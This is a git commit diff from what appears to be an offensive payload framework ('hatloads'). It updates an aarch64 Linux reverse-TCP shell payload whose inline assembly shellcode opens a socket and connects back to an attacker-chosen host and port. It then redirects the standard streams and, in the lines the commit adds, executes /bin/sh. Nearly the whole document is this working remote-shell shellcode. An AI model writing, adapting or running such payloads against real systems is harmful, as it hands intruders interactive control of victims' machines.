e22421d502dbcbf7398289e68581f40fb5175389
Ivan Nikolsky <enty8080@gmail.com>
2022-02-14 00:03:25 +0300

    Update shell_reverse_tcp.py

--- hatloads/payloads/linux/aarch64/shell_reverse_tcp.py
+++ hatloads/payloads/linux/aarch64/shell_reverse_tcp.py
@@ -46,34 +46,45 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
 
         shellcode = f"""
         start:
-            mov x8, #198
-            lsr x1, x8, #7
-            lsl x0, x1, #1
+            mov x8, 0xc6
+            lsr x1, x8, 0x7
+            lsl x0, x1, 0x1
             mov x2, xzr
-            svc #0x1337
+            svc 0
 
             mvn x4, x0
-            lsl x1, x1, #1
-            movk x1, #0x{rport.hex()}, lsl #16
-            movk x1, #0x{rhost[2:].hex()}, lsl #32
-            movk x1, #0x{rhost[:2].hex()}, lsl #48
-            str x1, [sp, #-8]!
+            lsl x1, x1, 0x1
+            movk x1, 0x{rport.hex()}, lsl 0x10
+            movk x1, 0x{rhost[2:].hex()}, lsl 0x20
+            movk x1, 0x{rhost[:2].hex()}, lsl 0x30
+            str x1, [sp, 8]
             add x1, sp, x2
-            mov x2, #16
-            mov x8, #203
-            svc #0x1337
+            mov x2, 0x10
+            mov x8, 0xcb
+            svc 0
 
-            lsr x1, x2, #2
+            lsr x1, x2, 0x2
 
         dup:
             mvn x0, x4
-            lsr x1, x1, #1
+            lsr x1, x1, 0x1
             mov x2, xzr
-            mov x8, #24
-            svc #0x1337
+            mov x8, 0x18
+            svc 0
 
-            cmp x1, #0
+            cmp x1, xzr
             bne dup
+
+            mov x1, 0x622f
+            movk x1, 0x6e69, lsl 0x10
+            movk x1, 0x732f, lsl 0x20
+            movk x1, 0x68, lsl 0x30
+            str x1, [sp, 8]
+            mov x1, xzr
+            mov x2, xzr
+            add x0, sp, x1
+            mov x8, 0xdd
+            svc 0
         """
 
         if assemble:
